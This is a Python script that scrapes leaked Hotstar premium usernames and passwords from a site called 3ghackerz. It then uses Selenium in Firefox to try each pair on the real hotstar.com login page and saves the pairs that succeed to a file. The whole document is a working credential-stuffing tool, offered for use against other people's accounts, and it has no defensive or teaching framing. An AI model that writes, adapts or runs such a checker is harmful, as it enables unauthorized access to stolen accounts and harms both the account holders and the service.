# This script scrapes the website 3ghackerz for hotstar premium ids and check for working ids by logging in 
# and then open all the working ids in new tab.
# CURRENTLY THE SCRIPT IS ONLY SUPPORTED IN FIREFOX
# YOU NEED TO HAVE ALL THE IMPORTED MODULES FOR THE SCRIPT TO BE WORKING
# pip install pandas, pip install selenium, pip install requests, pip install bs4
import pandas as pd
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
import time
import requests
from bs4 import BeautifulSoup

file = open('hotstar_ids.csv', 'w')
r = requests.get('https://www.3ghackerz.com/2018/11/hotstar-premium-account-free-trick.html')
soup = BeautifulSoup(r.text, 'html5lib')
ids = soup.select('span[style="color: #008000;"]')
for i in range(len(ids)):
    # USERNAME
    if i%2 == 0:
        file.write(ids[i].getText())
    # PASSWORDS
    else:
        file.write(":" + ids[i].getText() + "\n")
file.close()

df = pd.read_csv('hotstar_ids.csv', sep=':', header=None)
result = open('working_ids.txt', 'w')

browser = webdriver.Firefox()
emails = df.iloc[:, 0].values
passwords = df.iloc[:, 1].values
for email, password in zip(emails, passwords):
    browser.get('https://www.hotstar.com/')
    signIn = browser.find_element_by_class_name('signIn').click()
    using_mail = browser.find_element_by_class_name('email-or-fb-signin').click()
    email_ob= browser.find_element_by_id('emailID')
    email_ob.send_keys(email)
    browser.find_element_by_class_name('submit-button').click()
    time.sleep(1)
    try:
        password_ob = browser.find_element_by_id('password')
        password_ob.send_keys(password)
        browser.find_element_by_class_name('submit-button').click()
        time.sleep(2)
    except NoSuchElementException:
        continue
    try:
        browser.find_element_by_class_name('error-txt')
    except NoSuchElementException:
        browser.delete_all_cookies()
        result.write(email + ": " + password + "\n")
browser.refresh()
result.close()

